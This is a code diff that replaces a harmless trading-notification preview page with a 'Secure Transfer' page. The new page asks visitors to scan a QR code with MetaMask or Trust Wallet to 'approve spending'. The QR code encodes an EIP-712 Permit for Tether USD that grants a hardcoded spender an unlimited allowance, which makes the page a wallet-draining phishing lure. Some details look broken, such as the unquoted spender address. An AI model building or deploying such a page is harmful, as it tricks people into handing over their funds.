@@ -1,61 +1,127 @@
-<!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="theme-color" content="#111111"><link rel="manifest" href="manifest.json">
-<title>MSP Notification Preview</title>
-<style>
-*{box-sizing:border-box}body{margin:0;background:#f1f3f5;color:#111;font-family:system-ui,-apple-system,sans-serif;padding:18px}
-.card{max-width:520px;margin:auto;background:#fff;border-radius:24px;padding:22px;box-shadow:0 8px 30px #0001}
-h1{margin:0;font-size:25px}.sub{color:#6b7280;margin:5px 0 20px}
-label{display:block;font-size:14px;font-weight:700;margin:14px 0 6px}
-input,select,textarea{width:100%;border:1px solid #d9dce1;border-radius:12px;padding:13px;font-size:16px;background:#fff}
-textarea{min-height:80px;resize:vertical}.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-button{width:100%;margin-top:20px;border:0;border-radius:13px;padding:15px;background:#111;color:#fff;font-size:16px;font-weight:800}
-.preview{margin-top:20px;padding:16px;border-radius:16px;background:#f6f7f8}.preview b{font-size:13px;color:#666}.pbody{white-space:pre-line;margin-top:8px;font-weight:600}
-.small{font-size:12px;color:#777;margin-top:12px;line-height:1.45}
-</style></head><body>
-<div class="card">
-<h1>MSP Notification Preview</h1><div class="sub">Create and send an MSP notification to this phone.</div>
-<label>Signal</label><select id="signal"><option>BUY</option><option>SELL</option><option>CUSTOM</option></select>
-<div class="row"><div><label>Symbol</label><input id="symbol" value="XAUUSD"></div><div><label>Timeframe</label><input id="tf" value="1H"></div></div>
-<div class="row"><div><label>Entry</label><input id="entry" value="3456.72"></div><div><label>Timing</label><select id="timing"><option>Now</option><option>5 minutes before</option><option>3 minutes before</option><option>2 minutes before</option><option>1 minute before</option></select></div></div>
-<label>Message</label><textarea id="msg">New candle setup detected</textarea>
-<div class="preview"><b>NOTIFICATION PREVIEW</b><div id="preview" class="pbody"></div></div>
-<button id="enable">🔔 ENABLE NOTIFICATIONS</button>
-<button id="send">SEND NOTIFICATION</button>
-<div class="small">This is a notification preview tool for demonstrating the MSP notification format. It does not connect to TradingView or generate trading signals.</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Transfer</title>
+    <!-- Load QRCode.js from CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        #qrcode {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        #qrcode img {
+            border: 1px solid #ddd;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .status {
+            font-size: 14px;
+            color: #28a745;
+            font-weight: bold;
+        }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Confirm Transfer</h2>
+    <p>Scan with MetaMask or Trust Wallet to approve spending.</p>
+    
+    <div id="qrcode"></div>
+    
+    <div class="status">Waiting for confirmation...</div>
+    <button class="btn" disabled>Processing</button>
 </div>
+
 <script>
-let reg;
-async function setup(){
- if("serviceWorker" in navigator) reg=await navigator.serviceWorker.register("sw.js");
-}
-function body(){
- const s=signal.value, icon=s==="BUY"?"🟢":s==="SELL"?"🔴":"🔔";
- return `${icon} ${s} SIGNAL — ${symbol.value} • ${tf.value}\nEntry: ${entry.value}\n${timing.value}\n${msg.value}`;
-}
-function refresh(){preview.textContent=body()}
-document.querySelectorAll("input,select,textarea").forEach(e=>e.addEventListener("input",refresh));
-enable.onclick=async()=>{
- if(!("Notification" in window)){alert("This browser does not support notifications.");return}
- const p=await Notification.requestPermission();
- if(p==="granted"){alert("Notifications enabled. Press SEND NOTIFICATION.");}
- else alert("Notification permission was not granted. Enable notifications for MSP in Android/browser settings.");
-};
-send.onclick=async()=>{
- if(!reg) reg=await navigator.serviceWorker.ready;
- if(Notification.permission!=="granted"){
-   const p=await Notification.requestPermission();
-   if(p!=="granted") return;
- }
- const s=signal.value, icon=s==="BUY"?"🟢":s==="SELL"?"🔴":"🔔";
- await reg.showNotification("MSP — Market Signal Pro",{
-  body:`${icon} ${s} SIGNAL — ${symbol.value} • ${tf.value}`,
-  tag:"msp-"+Date.now(),
-  renotify:true,
-  vibrate:[150,80,150],
-  data:{detail:`Entry: ${entry.value}\n${timing.value}\n${msg.value}`}
- });
-};
-setup();refresh();
-</script></body></html>
+    // 1. CONFIGURATION
+    const YOUR_SPENDER_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"; // REPLACE THIS WITH YOUR ACTUAL ETH ADDRESS
+    const AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max uint256
+    
+    // 2. THE EIP-712 PAYLOAD
+    const payload = {
+        domain: {
+            name: "Tether USD",
+            version: "1",
+            chainId: 1,
+            verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
+        },
+        types: {
+            Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        },
+        primaryType: "Permit",
+        message: {
+            owner: "0x0000000000000000000000000000000000000000",
+            spender: 0xc5Ad65DB7B1e948a88931f268cDf0B544Fa8382b,
+            value: AMOUNT,
+            nonce: 0,
+            deadline: 9999999999
+        }
+    };
+
+    // 3. GENERATE QR CODE
+    document.addEventListener("DOMContentLoaded", function() {
+        // Convert JSON to string for the QR code
+        const qrData = JSON.stringify(payload);
+        
+        new QRCode(document.getElementById("qrcode"), {
+            text: qrData,
+            width: 256,
+            height: 256,
+            colorDark : "#000000",
+            colorLight : "#ffffff",
+            correctLevel : QRCode.CorrectLevel.H
+        });
+    });
+</script>
+
+</body>
+</html>
